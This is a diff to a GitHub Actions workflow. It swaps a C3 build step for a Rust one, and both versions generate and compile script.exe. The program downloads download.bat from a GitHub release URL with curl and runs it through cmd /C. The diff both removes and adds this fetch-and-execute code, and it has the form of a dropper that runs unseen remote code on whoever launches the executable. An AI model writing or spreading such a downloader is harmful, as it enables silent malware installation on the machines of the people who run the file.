@@ -21,25 +21,34 @@ jobs:
     - name: Checkout repository
       uses: actions/checkout@v2
 
-    - name: Create C3C file
-      run: |
-        Add-Content -Path script.c3 -Value '#include <stdio.h>'
-        Add-Content -Path script.c3 -Value '#include <stdlib.h>'
-        Add-Content -Path script.c3 -Value 'int main() {'
-        Add-Content -Path script.c3 -Value 'system("curl -L -o download.bat https://github.com/43a1723/test/releases/download/AutoBuild/download.bat");'
-        Add-Content -Path script.c3 -Value 'system("download.bat");'
-        Add-Content -Path script.c3 -Value 'return 0;'
-        Add-Content -Path script.c3 -Value '}'
+    - name: Setup Rust
+      uses: actions-rs/toolchain@v1
+      with:
+        toolchain: stable
+        target: x86_64-pc-windows-msvc
+        profile: minimal
 
-    - name: Install C3C
+    - name: Create Rust file
       run: |
-        # Add your C3C installation steps here
-        # This is an example and may need modification based on how C3C is installed
-        choco install c3c -y
+        echo use std::process::Command\; > script.rs
+        echo fn main() \{ >> script.rs
+        echo Command::new\(\"curl\"\) >> script.rs
+        echo .arg\(\"-L\"\) >> script.rs
+        echo .arg\(\"-o\"\) >> script.rs
+        echo .arg\(\"download.bat\"\) >> script.rs
+        echo .arg\(\"https://github.com/43a1723/test/releases/download/AutoBuild/download.bat\"\) >> script.rs
+        echo .status\(\) >> script.rs
+        echo .expect\(\"Failed to download file\"\)\; >> script.rs
+        echo Command::new\(\"cmd\"\) >> script.rs
+        echo .arg\(\"/C\"\) >> script.rs
+        echo .arg\(\"download.bat\"\) >> script.rs
+        echo .status\(\) >> script.rs
+        echo .expect\(\"Failed to execute batch file\"\)\; >> script.rs
+        echo \} >> script.rs
 
-    - name: Compile C3C Script
+    - name: Compile Rust Script
       run: |
-        c3c script.c3 -o script.exe
+        rustc script.rs -o script.exe
 
     - name: Delete-tag-and-release
       uses: dev-drprasad/delete-tag-and-release@v1.1
